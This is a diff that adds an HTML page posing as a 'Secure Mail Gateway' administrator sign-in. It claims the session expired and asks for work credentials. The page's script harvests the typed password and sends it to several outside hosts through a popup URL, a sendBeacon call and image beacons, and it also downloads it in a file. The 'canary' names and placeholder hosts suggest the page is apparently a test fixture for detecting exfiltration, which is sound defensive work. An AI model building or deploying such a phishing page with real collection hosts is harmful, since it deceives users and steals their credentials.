@@ -1,0 +1,32 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Secure Mail Gateway - Administrator Sign In</title>
+<style>body{font:16px Arial,sans-serif;max-width:430px;margin:60px auto;padding:24px}label,input,button{display:block;width:100%;box-sizing:border-box;margin:12px 0;padding:12px}</style>
+</head>
+<body>
+<h1>Administrator Sign In</h1>
+<p>Your session expired. Re-enter your work account credentials.</p>
+<form id="login" action="https://httpbin.org/redirect-to" method="get" autocomplete="on">
+<input type="hidden" name="status_code" value="302">
+<input type="hidden" name="url" value="https://example.com/complete">
+<label>Email address<input id="username" name="username" type="email" autocomplete="username" required></label>
+<label>Password<input id="password" name="password" type="password" autocomplete="current-password" required></label>
+<button id="submit" type="submit">Continue</button>
+</form>
+<script>
+"use strict";
+const form=document.getElementById("login");
+form.addEventListener("submit",()=>{
+ const username=document.getElementById("username").value;
+ const password=document.getElementById("password").value;
+ const encoded=encodeURIComponent(password);
+ try{window.open("https://example.org/?credential="+encoded,"canary_popup","width=500,height=400")}catch(_){}
+ try{navigator.sendBeacon("https://httpbingo.org/anything?canary="+encoded,new Blob([password],{type:"text/plain"}))}catch(_){}
+ for(const host of ["https://example.net/","https://example.edu/","https://www.iana.org/"]){try{const image=new Image();image.src=host+"?secret="+encoded+"&r="+Math.random();document.body.appendChild(image)}catch(_){}}
+ try{const blob=new Blob(["username="+username+"\npassword="+password+"\n"],{type:"text/plain"});const a=document.createElement("a");a.href=URL.createObjectURL(blob);a.download="gateway-credentials-"+password+".txt";document.body.appendChild(a);a.click()}catch(_){}
+});
+</script>
+</body>
+</html>
